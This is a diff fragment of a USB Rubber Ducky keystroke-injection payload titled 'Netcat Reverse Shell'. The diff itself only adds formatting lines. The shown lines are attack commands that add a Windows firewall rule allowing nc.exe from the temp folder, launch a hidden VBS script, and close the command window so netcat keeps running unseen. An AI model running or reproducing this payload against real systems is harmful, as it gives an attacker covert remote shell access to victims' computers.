@@ -1,3 +1,4 @@
+```
 REM Info and source: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload-Netcat-Reverse-Shell
 REM Title: Netcat Reverse Shell
 REM Author: Kanishk Singh
@@ -66,6 +67,7 @@ ENTER
 REM --> Add netcat to allowed programs list, enabling it to communicate through the firewall seamlessly
 STRING netsh advfirewall firewall add rule name="Netcat" dir=in action=allow program="%TEMP%\nc.exe" enable=yes
 ENTER
+
 STRING start invisible.vbs
 ENTER
 DELAY 100
@@ -76,3 +78,4 @@ ENTER
 REM --> Kills CMD while nc.exe continues running in background, remove Ducky after CMD closes
 STRING exit 
 ENTER
+```
